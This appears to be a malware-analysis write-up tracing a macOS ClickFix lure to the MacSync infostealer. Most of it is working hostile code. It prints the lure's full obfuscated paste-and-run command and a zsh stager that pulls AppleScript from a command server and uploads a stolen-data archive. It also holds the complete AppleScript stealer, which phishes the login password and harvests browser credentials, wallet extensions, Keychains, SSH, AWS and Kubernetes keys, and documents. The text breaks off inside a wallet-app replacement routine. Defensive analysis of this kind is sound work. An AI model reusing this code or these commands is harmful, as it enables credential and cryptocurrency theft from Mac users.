---
tags: InfoStealer
---

## From ClickFix to MacSync: Execution Chain Analysis on macOS

ClickFix is a social-engineering technique that relies on convincing users to perform a manual action, typically pasting and executing a command under the guise of fixing a problem. It first gained wider attention in the wild through fake CAPTCHA and “verify you are human” pages, where users were instructed to copy and run commands to proceed. Since then, ClickFix has been reused across multiple campaigns as a lightweight initial access method.

## ClickFix Lure

This execution chain starts with the following domain, which is often the target of various malvertising campaigns:

Domain: hxxps[://]macfilearchive[.]com/s3/

There is also a recent Reddit post on r/MacOS where a user has fallen victim to this specific campaign: https://www.reddit.com/r/MacOS/comments/1pramrh/did_i_mess_upcompromise_my_mac_security_any/

<img width="1007" height="1069" alt="image" src="https://github.com/user-attachments/assets/dab21879-3c91-4020-9ba8-34872b43d6a5" />

This legitimate looking domain instructs users to copy and paste the command in the code block. At first glance, it seems harmless as it references Apple's legitimate domain, but the full command is as follows:

```bash
echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg" && curl -kfsSL $(echo 'aHR0cDovL2JhbGxmcmFuay50b2RheS9jdXJsLzI3MDY1M2Y4NjJmMGVlMjFkY2UwYTQ2ZTQ4MDFlYzI4ZGI0ZGRjNzdiNmZiYTkzNDFiMWI4ZGIyOTkwOWM1MTQ='|base64 -D)|zsh
```

A curl command is appended which executes a Base64 chunk, decoded to reveal:

```
hxxp[://]ballfrank[.]today/curl/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514
```

I'll instead download the contents of this file without executing it, which results in:

```bash
#!/bin/zsh
d23727=$(base64 -D <<'PAYLOAD_m317823069430411' | gunzip
H4sIAK23RWkAA+VUXW/TMBR976+4eNW0SSSx89l2lG1CgqFRDWlDTAJUOfZ1a9VxosSFbsB/J3RV
l5U+8YSEn6Jzj0/uPecmB8+CXNvgvpn3JMeitFO1tMLp0h4dw/cetAdXKOBFIPFrYJfGPGIv92Dh
DmhKwQ3IsuDajknOjVE1twvflZLfkQ7FlQtsGWFG0yRSgzRUFDFkUiDlcYrxgDIU4UDmsZQiy/JU
5XwYxSxneQuGwyEdioTFXUle6ekC78YkYUOKimVRxAYRp1KkkcrTMIqSTCWpTB8uaQWfoH8A3swB
hS8n4OZo15XfRyxrA94CvAY8r+Arz+kCIaLgXQD50GDtnc/QuhFMynttDA8Sn8LRhAttXdnMT+Ct
dWigBeDqGm6B0SlLptkxnFeVwY+YX2oXJFHmRykcXV7cTN49B6MXCG9QLMpjeDWvywKDIfOpH8dZ
6DMWwzVXvNaba2TdSju01w49gv5mfAJk7lw1CoL+QwyBvLO80OLUreS4v/b9sPrWPjICP6BseCNq
XbmHTE2D/4cFf86udGctTsGzuGctcKUdsC5/69ItvL+6voHPW+6/5NNOV3ss22EIMwL6FO3uAH1S
eQ1EaYPjs8AVVdDaasrZTNuZf68rssvMl9rIbhCd+m5uM+6Q/FUsdQGegj399H72Wq2dnx+Q/hmB
w0fRtSDtbb+HzQta8V/NI7r4QgUAAA==
PAYLOAD_m317823069430411
)
eval "$d23727"
```

The Base64 body can be transformed from base64 and gunzipped to reveal:

```bash
#!/bin/zsh
daemon_function() {
    exec </dev/null
    exec >/dev/null
    exec 2>/dev/null
    local domain="ballfrank[.]today"
    local token="270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
    local api_key="5190ef1733183a0dc63fb623357f56d6"
    if [ $# -gt 0 ]; then
        curl -k -s --max-time 30 -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" -H "api-key: $api_key" "http://$domain/dynamic?txd=$token&pwd=$1" | osascript
    else
        curl -k -s --max-time 30 -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" -H "api-key: $api_key" "http://$domain/dynamic?txd=$token" | osascript
    fi
    if [ $? -ne 0 ]; then
        exit 1
    fi
    curl -k -X POST \
         -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
         -H "api-key: $api_key" \
         -H "cl: 0" \
         --max-time 300 \
         -F "file=@/tmp/osalogging.zip" \
         -F "buildtxd=$token" \
         "http://$domain/gate"
    if [ $? -ne 0 ]; then
        exit 1
    fi
    rm -f /tmp/osalogging.zip
}
if daemon_function "$@" & then
    exit 0
else
    exit 1
fi
```

## MacSync Infostealer Payload

<details>
  <summary>MacSync Infostealing script (click to expand)</summary>
  <pre><code>
on filesizer(paths)
	set fsz to 0
	try
		set theItem to quoted form of POSIX path of paths
		set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
	end try
	return fsz
end filesizer

on mkdir(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		do shell script "mkdir -p " & filePosixPath
	end try
end mkdir

on FileName(filePath)
	try
		set reversedPath to (reverse of every character of filePath) as string
		set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
		set finalPath to (reverse of every character of trimmedPath) as string
		return finalPath
	end try
end FileName

on BeforeFileName(filePath)
	try
		set lastSlash to offset of "/" in (reverse of every character of filePath) as string
		set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
		return trimmedPath
	end try
end BeforeFileName

on writeText(textToWrite, filePath)
	try
		set folderPath to BeforeFileName(filePath)
		mkdir(folderPath)
		set fileRef to (open for access filePath with write permission)
		write textToWrite to fileRef starting at eof
		close access fileRef
	end try
end writeText

on readwrite(path_to_file, path_as_save)
	try
		set fileContent to read path_to_file
		set folderPath to BeforeFileName(path_as_save)
		mkdir(folderPath)
		do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
	end try
end readwrite

on isDirectory(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		set fileType to (do shell script "file -b " & filePosixPath)
		if fileType ends with "directory" then
			return true
		end if
		return false
	end try
end isDirectory

on GrabFolderLimit(sourceFolder, destinationFolder)
	try
		set bankSize to 0
		set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews"}
		set fileList to list folder sourceFolder without invisibles
		mkdir(destinationFolder)
		repeat with currentItem in fileList
			if currentItem is not in exceptionsList then
				set itemPath to sourceFolder & "/" & currentItem
				set savePath to destinationFolder & "/" & currentItem
				if isDirectory(itemPath) then
					GrabFolderLimit(itemPath, savePath)
				else
					set fsz to filesizer(itemPath)
					set bankSize to bankSize + fsz
					if bankSize < 100 * 1024 * 1024 then
						readwrite(itemPath, savePath)
					end if
				end if
			end if
		end repeat
	end try
end GrabFolderLimit

on GrabFolder(sourceFolder, destinationFolder)
	try
		set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "dumps", "emoji", "user_data", "__update__"}
		set fileList to list folder sourceFolder without invisibles
		mkdir(destinationFolder)
		repeat with currentItem in fileList
			if currentItem is not in exceptionsList then
				set itemPath to sourceFolder & "/" & currentItem
				set savePath to destinationFolder & "/" & currentItem
				if isDirectory(itemPath) then
					GrabFolder(itemPath, savePath)
				else
					readwrite(itemPath, savePath)
				end if
			end if
		end repeat
	end try
end GrabFolder

on checkvalid(username, password_entered)
	try
		set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
		if result is not equal to "" then
			return false
		else
			return true
		end if
	on error
		return false
	end try
end checkvalid

on getpwd(username, writemind, provided_password)
    try
        if provided_password is not equal to "" then
            if checkvalid(username, provided_password) then
                writeText(provided_password, writemind & "Password")
                return provided_password
            end if
        end if
        if checkvalid(username, "") then
            set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
            writeText(result as string, writemind & "masterpass-chrome")
            return ""
        else
            repeat
				set imagePath to "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/LockedIcon.icns" as POSIX file
                set result to display dialog "Required Application Helper. Please enter password for continue." default answer "" with icon imagePath buttons {"Continue"} default button "Continue" giving up after 150 with title "System Preferences" with hidden answer
                set password_entered to text returned of result
                if checkvalid(username, password_entered) then
                    writeText(password_entered, writemind & "Password")
                    return password_entered
                end if
            end repeat
        end if
    end try
    return ""
end getpwd

on grabPlugins(paths, savePath, pluginList, index)
	try
		set fileList to list folder paths without invisibles
		repeat with PFile in fileList
			repeat with Plugin in pluginList
				if (PFile contains Plugin) then
					set newpath to paths & PFile
					set newsavepath to savePath & "/" & Plugin
					if index then
						set newsavepath to savePath & "/IndexedDB/" & PFile
					end if
					GrabFolder(newpath, newsavepath)
				end if
			end repeat
		end repeat
	end try
end grabPlugins

on Chromium(writemind, chromium_map)
   	
	set pluginList to {}
    set pluginList to pluginList & {"eiaeiblijfjekdanodkjadfinkhbfgcd", "aeblfdkhhhdcdjpifhhbdiojplfjncoa"}
    set pluginList to pluginList & {"bfogiafebfohielmmehodmfbbebbbpei", "nngceckbapebfimnlniiiahkandclblb"}
    set pluginList to pluginList & {"fdjamakpfbbddfjaooikfcpapjohcfmg", "hdokiejnpimakedhajhdlcegeplioahd"}
    set pluginList to pluginList & {"pnlccmojcmeohlpggmfnbbiapkmbliob", "ghmbeldphafepmbegfdlkpapadhbakde"}
    set pluginList to pluginList & {"kmcfomidfpdkfieipokbalgegidffkal", "bnfdmghkeppfadphbnkjcicejfepnbfe"}
    set pluginList to pluginList & {"caljgklbbfbcjjanaijlacgncafpegll", "folnjigffmbjmcjgmbbfcpleeddaedal"}
    set pluginList to pluginList & {"igkpcodhieompeloncfnbekccinhapdb", "admmjipmmciaobhojoghlmleefbicajg"}
    set pluginList to pluginList & {"ehpbfbahieociaeckccnklpdcmfaeegd", "epanfjkfahimkgomnigadpkobaefekcd"}
    set pluginList to pluginList & {"didegimhafipceonhjepacocaffmoppf", "oboonakemofpalcgghocfoadofidjkkk"}
    set pluginList to pluginList & {"jgnfghanfbjmimbdmnjfofnbcgpkbegj", "mmhlniccooihdimnnjhamobppdhaolme"}
    set pluginList to pluginList & {"dbfoemgnkgieejfkaddieamagdfepnff", "bhghoamapcdpbohphigoooaddinpkbai"}
    set pluginList to pluginList & {"nngceckbapebfimnlniiiahkandclblb", "lojeokmpinkpmpbakfkfpgfhpapbgdnd"}
    set pluginList to pluginList & {"ibpjepoimpcdofeoalokgpjafnjonkpc", "gmohoglkppnemohbcgjakmgengkeaphi"}
    set pluginList to pluginList & {"hdokiejnpimakedhajhdlcegeplioahd", "oboonakemofpalcgghocfoadofidjkkk"}
    set pluginList to pluginList & {"dckgbiealcgdhgjofgcignfngijpbgba", "gmegpkknicehidppoebnmbhndjigpica"}
    set pluginList to pluginList & {"eiokpeobbgpinbmcanngjjbklmhlepan", "odfkmgboddhcgopllebhkbjhokpojigd"}
    set pluginList to pluginList & {"ppnbnpeolgkicgegkbkbjmhlideopiji", "cejfhijdfemlohmcjknpbeaohedoikpp"}
    set pluginList to pluginList & {"nmhjblhloefhbhgbfkdgdpjabaocnhha", "iklgijhacenjgjgdnpnohbafpbmnccek"}
    set pluginList to pluginList & {"ppkkcfblhfgmdmefkmkoomenhgecbemi", "lgndjfkadlbpaifdpbbobdodbaiaiakb"}
    set pluginList to pluginList & {"bbphmbmmpomfelajledgdkgclfekilei", "bnfooenhhgcnhdkdjelgmmkpaemlnoek"}

	set chromiumFiles to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/"}
	repeat with chromium in chromium_map
		set savePath to writemind & "Browsers/" & item 1 of chromium & "_"
		try
			set fileList to list folder item 2 of chromium without invisibles
			repeat with currentItem in fileList
				if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
					set profileName to (item 1 of chromium & currentItem)
					repeat with CFile in chromiumFiles
						set readpath to (item 2 of chromium & currentItem & CFile)
						if ((CFile as string) is equal to "/Network/Cookies") then
							set CFile to "/Cookies"
						end if
						if ((CFile as string) is equal to "/Local Extension Settings/") then
							grabPlugins(readpath, writemind & "Extensions/" & profileName, pluginList, false)
						else if (CFile as string) is equal to "/IndexedDB/" then
							grabPlugins(readpath, writemind & "Extensions/" & profileName, pluginList, true)
						else
							set writepath to savePath & currentItem & CFile
							readwrite(readpath, writepath)
						end if
					end repeat
				end if
			end repeat
		end try
	end repeat
end Chromium

on ChromiumWallets(writemind, chromium_map)
   	
	set pluginList to {}

	set pluginList to pluginList & {"nkbihfbeogaeaoehlefnkodbefgpgknn", "bfnaelmomeimhlpmgjnjophhpkkoljpa"}
	set pluginList to pluginList & {"hnfanknocfeofbddgcijnmhnfnkdnaad", "fnjhmkhhmkbjkkabndcnnogagogbneec"}
	set pluginList to pluginList & {"acmacodkjbdgmoleebolmdjonilkdbch", "egjidjbpglichdcondbcbdnbeeppgdph"}
	set pluginList to pluginList & {"aholpfdialjgjfhomihkjbmgjidlcdno", "pdliaogehgdbhbnmkklieghmmjkpigpa"}
	set pluginList to pluginList & {"mcohilncbfahbmgdjkbpemcciiolgcge", "hpglfhgfnhbgpjdenjgmdgoeiappafln"}
	set pluginList to pluginList & {"bhhhlbepdkbapadjdnnojkbgioiodbic", "cjmkndjhnagcfbpiemnkdpomccnjblmj"}
	set pluginList to pluginList & {"kamfleanhcmjelnhaeljonilnmjpkcjc", "jnldfbidonfeldmalbflbmlebbipcnle"}
	set pluginList to pluginList & {"fdcnegogpncmfejlfnffnofpngdiejii", "klnaejjgbibmhlephnhpmaofohgkpgkd"}
	set pluginList to pluginList & {"kjjebdkfeagdoogagbhepmbimaphnfln", "ldinpeekobnhjjdofggfgjlcehhmanlj"}
	set pluginList to pluginList & {"kpfchfdkjhcoekhdldggegebfakaaiog", "idnnbdplmphpflfnlkomgpfbpcgelopg"}
	set pluginList to pluginList & {"mlhakagmgkmonhdonhkpjeebfphligng", "bipdhagncpgaccgdbddmbpcabgjikfkn"}
	set pluginList to pluginList & {"nhnkbkgjikgcigadomkphalanndcapjk", "klghhnkeealcohjjanjjdaeeggmfmlpl"}
	set pluginList to pluginList & {"ebfidpplhabeedpnhjnobghokpiioolj", "emeeapjkbcbpbpgaagfchmcgglmebnen"}
	set pluginList to pluginList & {"fldfpgipfncgndfolcbkdeeknbbbnhcc", "penjlddjkjgpnkllboccdgccekpkcbin"}
	set pluginList to pluginList & {"hmeobnfnfcmdkdcmlblgagmfpfboieaf", "omaabbefbmiijedngplfjmnooppbclkk"}
	set pluginList to pluginList & {"jnlgamecbpmbajjfhmmmlhejkemejdma", "fpkhgmpbidmiogeglndfbkegfdlnajnf"}
	set pluginList to pluginList & {"bifidjkcdpgfnlbcjpdkdcnbiooooblg", "amkmjjmmflddogmhpjloimipbofnfjih"}
	set pluginList to pluginList & {"aeachknmefphepccionboohckonoeemg", "dmkamcknogkgcdfhhbddcghachkejeap"}
	set pluginList to pluginList & {"aiifbnbfobpmeekipheeijimdpnlpgpp", "ehgjhhccekdedpbkifaojjaefeohnoea"}
	set pluginList to pluginList & {"nknhiehlklippafakaeklbeglecifhad", "nphplpgoakhhjchkkhmiggakijnkhfnd"}
	set pluginList to pluginList & {"ibnejdfjmmkpcnlpebklmnkoeoihofec", "afbcbjpbpfadlkmhmclhkeeodmamcflc"}
	set pluginList to pluginList & {"efbglgofoippbgcjepnhiblaibcnclgk", "fccgmnglbhajioalokbcidhcaikhlcpm"}
	set pluginList to pluginList & {"mgffkfbidihjpoaomajlbgchddlicgpn", "fopmedgnkfpebgllppeddmmochcookhc"}
	set pluginList to pluginList & {"jojhfeoedkpkglbfimdfabpdfjaoolaf", "abkahkcbhngaebpcgfmhkoioedceoigp"}
	set pluginList to pluginList & {"gkeelndblnomfmjnophbhfhcjbcnemka", "hgbeiipamcgbdjhfflifkgehomnmglgk"}
	set pluginList to pluginList & {"ellkdbaphhldpeajbepobaecooaoafpg", "mdnaglckomeedfbogeajfajofmfgpoae"}
	set pluginList to pluginList & {"ckklhkaabbmdjkahiaaplikpdddkenic", "fmblappgoiilbgafhjklehhfifbdocee"}
	set pluginList to pluginList & {"cnmamaachppnkjgnildpdmkaakejnhae", "fijngjgcjhjmmpcmkeiomlglpeiijkld"}
	set pluginList to pluginList & {"lbjapbcmmceacocpimbpbidpgmlmoaao", "ibljocddagjghmlpgihahamcghfggcjc"}
	set pluginList to pluginList & {"gkodhkbmiflnmkipcmlhhgadebbeijhh", "dbgnhckhnppddckangcjbkjnlddbjkna"}
	set pluginList to pluginList & {"agoakfejjabomempkjlepdflaleeobhb", "dgiehkgfknklegdhekgeabnhgfjhbajd"}
	set pluginList to pluginList & {"onhogfjeacnfoofkfgppdlbmlmnplgbn", "ojggmchlghnjlapmfbnjholfjkiidbch"}
	set pluginList to pluginList & {"pmmnimefaichbcnbndcfpaagbepnjaig", "anokgmphncpekkhclmingpimjmcooifb"}
	set pluginList to pluginList & {"kkpllkodjeloidieedojogacfhpaihoh", "iokeahhehimjnekafflcihljlcjccdbe"}
	set pluginList to pluginList & {"ifckdpamphokdglkkdomedpdegcjhjdp", "loinekcabhlmhjjbocijdoimmejangoa"}
	set pluginList to pluginList & {"fcfcfllfndlomdhbehjjcoimbgofdncg", "ifclboecfhkjbpmhgehodcjpciihhmif"}
	set pluginList to pluginList & {"ookjlbkiijinhpmnjffcofjonbfbgaoc", "oafedfoadhdjjcipmcbecikgokpaphjk"}
	set pluginList to pluginList & {"mapbhaebnddapnmifbbkgeedkeplgjmf", "lgmpcpglpngdoalbgeoldeajfclnhafa"}
	set pluginList to pluginList & {"ppbibelpcjmhbdihakflkdcoccbgbkpo", "ffnbelfdoeiohenkjibnmadjiehjhajb"}
	set pluginList to pluginList & {"opcgpfmipidbgpenhmajoajpbobppdil", "hdkobeeifhdplocklknbnejdelgagbao"}
	set pluginList to pluginList & {"lnnnmfcpbkafcpgdilckhmhbkkbpkmid", "nbdhibgjnjpnkajaghbffjbkcgljfgdi"}
	set pluginList to pluginList & {"kmhcihpebfmpgmihbkipmjlmmioameka", "kmphdnilpmdejikjdnlbcnmnabepfgkh"}

	set chromiumFiles to {"/Local Extension Settings/", "/IndexedDB/"}
	repeat with chromium in chromium_map
		try
			set fileList to list folder item 2 of chromium without invisibles
			repeat with currentItem in fileList
				if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
					set profileName to (item 1 of chromium & currentItem)
					repeat with CFile in chromiumFiles
						set readpath to (item 2 of chromium & currentItem & CFile)
						if ((CFile as string) is equal to "/Local Extension Settings/") then
							grabPlugins(readpath, writemind & "Wallets/Web/" & profileName, pluginList, false)
						else if (CFile as string) is equal to "/IndexedDB/" then
							grabPlugins(readpath, writemind & "Wallets/Web/" & profileName, pluginList, true)
						else
							set writepath to savePath & currentItem & CFile
							readwrite(readpath, writepath)
						end if
					end repeat
				end if
			end repeat
		end try
	end repeat
end Chromium

on Gecko(writemind, gecko_map)
	set geckoFiles to {"/cert9.db", "/cookies.sqlite", "/cookies.sqlite-wal", "/formhistory.sqlite", "/key4.db", "/logins-backup.json", "/logins.json", "/signons.sqlite", "/places.sqlite"}
	repeat with gecko in gecko_map
		set savePath to writemind & "Browsers/" & item 1 of gecko & "_"
        try
			set fileList to list folder item 2 of gecko without invisibles
			repeat with currentItem in fileList
				if ((currentItem as string) contains "Profile") or ((currentItem as string) contains ".default") then
					set profileName to (item 1 of gecko & currentItem)
					repeat with CFile in geckoFiles
						set readpath to (item 2 of gecko & currentItem & CFile)
						set writepath to savePath & currentItem & CFile
						readwrite(readpath, writepath)
					end repeat
				end if
			end repeat
        end try
    end repeat
end Gecko

on Telegram(writemind, library)
		try
			GrabFolder(library & "Telegram Desktop/tdata/", writemind & "Telegram Desktop/")
		end try
end Telegram

on Keychains(writemind)
		try
			do shell script "cp ~/Library/Keychains/*.keychain-db " & quoted form of (POSIX path of writemind)
		end try
end Keychains

on CloudKeys(writemind)
		try
			do shell script "cp -r ~/.ssh " & quoted form of (POSIX path of writemind)
		end try
		try
			do shell script "cp -r ~/.aws " & quoted form of (POSIX path of writemind)
		end try
		try
			do shell script "cp -r ~/.kube " & quoted form of (POSIX path of writemind)
		end try
end CloudKeys

on DesktopWallets(writemind, deskwals)
	repeat with deskwal in deskwals
		try
			GrabFolder(item 2 of deskwal, writemind & item 1 of deskwal)
		end try
	end repeat
end DesktopWallets

on Filegrabber(writemind)
 try
  set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
  mkdir(destinationFolderPath)
  set destinationSafariPath to POSIX file (writemind & "Safari/")
  mkdir(destinationSafariPath)
  set destinationNotesPath to POSIX file (writemind & "Notes/")
  mkdir(destinationNotesPath)
  set extensionsList to {"pdf", "docx", "doc", "wallet", "key", "keys", "db", "txt", "seed", "rtf", "kdbx", "pem", "ovpn"}
  set bankSize to 0
  set fileCounter to 1
  
  tell application "Finder"
	try
		duplicate file ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:Cookies.binarycookies") to folder (destinationSafariPath) with replacing
	end try
	try
		set notesDB to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"
		set dbFiles to {"NoteStore.sqlite", "NoteStore.sqlite-shm", "NoteStore.sqlite-wal"}
		repeat with dbFile in dbFiles
			try
				duplicate (file dbFile of folder notesDB) to folder (destinationNotesPath) with replacing
			end try
		end repeat
	end try
	try
		set desktopFiles to every file of desktop
		set documentsFiles to every file of folder "Documents" of (path to home folder)
		set downloadsFiles to every file of folder "Downloads" of (path to home folder)
		
		repeat with aFile in (desktopFiles & documentsFiles & downloadsFiles)
		set fileExtension to name extension of aFile
		if fileExtension is in extensionsList then
		set filesize to size of aFile
		if (bankSize + filesize) < 10 * 1024 * 1024 then
		try
			set newFileName to (fileCounter as string) & "." & fileExtension
			duplicate aFile to folder destinationFolderPath with replacing
			set destFolderAlias to destinationFolderPath as alias
			tell application "Finder"
			set copiedFiles to every file of folder destFolderAlias
			set lastCopiedFile to item -1 of copiedFiles
			set name of lastCopiedFile to newFileName
			end tell
			
			set bankSize to bankSize + filesize
			set fileCounter to fileCounter + 1
		end try
		else
		exit repeat
		end if
		end if
		end repeat
	end try
  end tell
 end try
end Filegrabber


on FilegrabberFDA(writemind, profile)
	set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
	mkdir(destinationFolderPath)
	try

		set sourceFolders to {profile & "/Downloads/", profile & "/Documents/", profile & "/Desktop/"}
		set extensionsList to {"pdf", "docx", "doc", "wallet", "key", "keys", "db", "txt", "seed", "rtf", "kdbx", "pem", "ovpn"}

		repeat with src in sourceFolders
			repeat with ext in extensionsList
				try
					set shellCmd to "find " & quoted form of (POSIX path of src) & " -maxdepth 1 -type f -iname '*." & ext & "' -print0 | xargs -0 -J% cp -vp % " & quoted form of (POSIX path of destinationFolderPath)
					do shell script shellCmd
				end try
			end repeat
		end repeat

	end try
	try	
		readwrite(profile & "/Library/Cookies/Cookies.binarycookies", writemind & "Safari/Cookies.binarycookies")
		readwrite(profile & "/Library/Safari/Form Values", writemind & "Safari/Autofill")
		readwrite(profile & "/Library/Safari/History.db", writemind & "Safari/History.db")
	end try
	try
		readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite", writemind & "Notes/NoteStore.sqlite")
		readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm", writemind & "Notes/NoteStore.sqlite-shm")
		readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal", writemind & "Notes/NoteStore.sqlite-wal")
	
	end try

end Filegrabber



try
	do shell script "killall Terminal"
end try

set username to (system attribute "USER")
set profile to "/Users/" & username
set randomNumber to do shell script "echo $((RANDOM % 9000000 + 1000000))"
set writemind to "/tmp/sync" & randomNumber & "/"

set library to profile & "/Library/Application Support/"
set password_entered to getpwd(username, writemind, "")

delay 0.01

set chromiumMap to {}
set chromiumMap to chromiumMap & {{"Yandex", library & "Yandex/YandexBrowser/"}}
set chromiumMap to chromiumMap & {{"Chrome", library & "Google/Chrome/"}}
set chromiumMap to chromiumMap & {{"Brave", library & "BraveSoftware/Brave-Browser/"}}
set chromiumMap to chromiumMap & {{"Edge", library & "Microsoft Edge/"}}
set chromiumMap to chromiumMap & {{"Vivaldi", library & "Vivaldi/"}}
set chromiumMap to chromiumMap & {{"Opera", library & "com.operasoftware.Opera/"}}
set chromiumMap to chromiumMap & {{"OperaGX", library & "com.operasoftware.OperaGX/"}}
set chromiumMap to chromiumMap & {{"Chrome Beta", library & "Google/Chrome Beta/"}}
set chromiumMap to chromiumMap & {{"Chrome Canary", library & "Google/Chrome Canary"}}
set chromiumMap to chromiumMap & {{"Chromium", library & "Chromium/"}}
set chromiumMap to chromiumMap & {{"Chrome Dev", library & "Google/Chrome Dev/"}}
set chromiumMap to chromiumMap & {{"Arc", library & "Arc/User Data"}}
set chromiumMap to chromiumMap & {{"Coccoc", library & "CocCoc/Browser/"}}

set geckoMap to {}
set geckoMap to geckoMap & {{"Firefox", library & "Firefox/Profiles/"}}
#set geckoMap to geckoMap & {{"Thunderbird", library & "Thunderbird/Profiles/"}}
#set geckoMap to geckoMap & {{"SeaMonkey", library & "SeaMonkey/Profiles/"}}
#set geckoMap to geckoMap & {{"Waterfox", library & "Waterfox/Profiles/"}}

set walletMap to {}
set walletMap to walletMap & {{"Wallets/Desktop/Exodus", library & "Exodus/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Electrum", profile & "/.electrum/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Atomic", library & "Atomic Wallet/Local Storage/leveldb/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Guarda", library & "Guarda/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Coinomi", library & "Coinomi/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Sparrow", profile & "/.sparrow/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Wasabi", profile & "/.walletwasabi/client/Wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Bitcoin_Core", library & "Bitcoin/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Armory", library & "Armory/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Electron_Cash", profile & "/.electron-cash/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Monero", profile & "/.bitmonero/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Litecoin_Core", library & "Litecoin/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Dash_Core", library & "DashCore/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Dogecoin_Core", library & "Dogecoin/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Electrum_LTC", profile & "/.electrum-ltc/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/BlueWallet", library & "BlueWallet/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Zengo", library & "Zengo/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Trust", library & "Trust Wallet/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Ledger Live", library & "Ledger Live/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Ledger Wallet", library & "Ledger Wallet/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Trezor Suite", library & "@trezor"}}

readwrite(library & "Binance/", writemind & "Wallets/Desktop/Binance/")
readwrite(library & "TON Keeper/", writemind & "Wallets/Desktop/TonKeeper/")
readwrite(profile & "/.zshrc", writemind & "Profile/.zshrc")
readwrite(profile & "/.zsh_history", writemind & "Profile/.zsh_history")
readwrite(profile & "/.bash_history", writemind & "Profile/.bash_history")
readwrite(profile & "/.gitconfig", writemind & "Profile/.gitconfig")

writeText(username, writemind & "Username")
writeText("1.1.2_release (x64_86 & ARM)", writemind & "Version")

try
	writeText("MacSync Stealer\n\n", writemind & "info")
	writeText("Build Tag: s3\n", writemind & "info")
	writeText("Version: 1.1.2_release (x64_86 & ARM)\n", writemind & "info")
        writeText("IP: [REDACTED_IP]\n\n", writemind & "info")
	writeText("Username: " & username, writemind & "info")
	writeText("\nPassword: " & password_entered & "\n\n", writemind & "info")
	set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
	writeText(result, writemind & "info")
end try

Chromium(writemind, chromiumMap)
ChromiumWallets(writemind, chromiumMap)
Gecko(writemind, geckoMap)
DesktopWallets(writemind, walletMap)
Telegram(writemind, library)
Keychains(writemind)
CloudKeys(writemind & "Profile/")

Filegrabber(writemind)

try
	do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/osalogging.zip"
end try
try
	do shell script "rm -rf /tmp/sync*"
end try

display dialog "Your Mac does not support this application. Try reinstalling or downloading the version for your system." with title "System Preferences" with icon stop buttons {"ОК"}


set LEDGERURL to "hxxps[://]ballfrank[.]today/ledger/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
set LEDGERMOUNT to "/tmp"
set LEDGERPATH0 to LEDGERMOUNT & "/app.asar"
set LEDGERPATH1 to LEDGERMOUNT & "/Info.plist"
set LEDGERDMGPATH to LEDGERMOUNT & "/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514.zip"
set LEDGERNAME to "Ledger Wallet.app"
set LEDGERAPPFOLDER to "/Applications"
set LEDGERDEST to LEDGERAPPFOLDER & "/" & LEDGERNAME
set LEDGERTMPDEST to "/tmp/Ledger Wallet.app"
set LEDGERDESTFILE0 to LEDGERDEST & "/Contents/Resources/app.asar"
set LEDGERDESTFILE1 to LEDGERDEST & "/Contents/Info.plist"

try
    do shell script "test -d " & quoted form of LEDGERDEST
    set ledger_installed to true
on error
    set ledger_installed to false
end try

if ledger_installed then
    try
